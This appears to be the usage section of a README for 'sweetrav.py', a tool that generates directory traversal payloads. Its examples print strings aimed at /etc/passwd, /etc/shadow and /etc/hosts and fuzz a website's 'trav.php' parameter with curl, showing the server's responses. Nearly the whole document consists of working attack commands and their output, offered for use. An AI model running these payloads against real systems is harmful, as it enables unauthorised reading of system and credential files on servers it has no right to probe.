## Usage
```
usage: sweetrav.py [-h] [-p PATH] [-d DEPTH] [-s SEPARATOR] [-r RANGE] [-a APPEND] [-A APPEND] [-f FUZZ] [-e ENCODING] [-t] [-i]

          __    __    _______                  _
         / /   / /   / / ____|                | |
        / /   / /   / / (_____      _____  ___| |_ _ __ __ ___   __
       / /   / /   / / \___ \ \ /\ / / _ \/ _ \ __| '__/ _` \ \ / /
  _ _ / / _ / / _ / /  ____) \ V  V /  __/  __/ |_| | | (_| |\ V /
 (_|_)_(_|_)_(_|_)_/  |_____/ \_/\_/ \___|\___|\__|_|  \__,_| \_/


../../../../../../by_firedragon9511


options:
  -h, --help            show this help message and exit
  -p PATH, --path PATH  specify current folder.
  -d DEPTH, --depth DEPTH
                        generate using depth.
  -s SEPARATOR, --separator SEPARATOR
                        custom separator.
  -r RANGE, --range RANGE
                        generate a list. Ex.: 1-10.
  -a APPEND, --append APPEND
                        append to final.
  -A APPEND, --Append APPEND
                        append to final using list. Ex.: -r 1-10 -A files.txt
  -f FUZZ, --fuzz FUZZ  fuzz script. Ex.: -f "./script.sh FUZZ".
  -e ENCODING, --encoding ENCODING
                        Available encodings: urlencode, doubleencode, base64.
  -t, --trim            replace duplicated bars.
  -i                    use stdin pipe.

```
## Some Examples

```
PS C:\sweetrav> python sweetrav.py -r 5-10 -A files.txt
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../etc/shadow
../../../../../../etc/shadow
../../../../../../../etc/shadow
../../../../../../../../etc/shadow
../../../../../../../../../etc/shadow
../../../../../../../../../../etc/shadow
../../../../../etc/hosts
../../../../../../etc/hosts
../../../../../../../etc/hosts
../../../../../../../../etc/hosts
../../../../../../../../../etc/hosts
../../../../../../../../../../etc/hosts
```

```
PS C:\travmaker> python sweetrav.py -r 4-10 -a '/etc/passwd' -f 'curl "http://site123.com/?trav.php=FUZZ"' -t
<a href="http://www.site123.com/?trav.php=../../../../etc/passwd">Moved Permanently</a>.

../../../../etc/passwd
<a href="http://www.site123.com/?trav.php=../../../../../etc/passwd">Moved Permanently</a>.

../../../../../etc/passwd
<a href="http://www.site123.com/?trav.php=../../../../../../etc/passwd">Moved Permanently</a>.

../../../../../../etc/passwd
<a href="http://www.site123.com/?trav.php=../../../../../../../etc/passwd">Moved Permanently</a>.

../../../../../../../etc/passwd
<a href="http://www.site123.com/?trav.php=../../../../../../../../etc/passwd">Moved Permanently</a>.

../../../../../../../../etc/passwd
<a href="http://www.site123.com/?trav.php=../../../../../../../../../etc/passwd">Moved Permanently</a>.

../../../../../../../../../etc/passwd
<a href="http://www.site123.com/?trav.php=../../../../../../../../../../etc/passwd">Moved Permanently</a>.

../../../../../../../../../../etc/passwd
```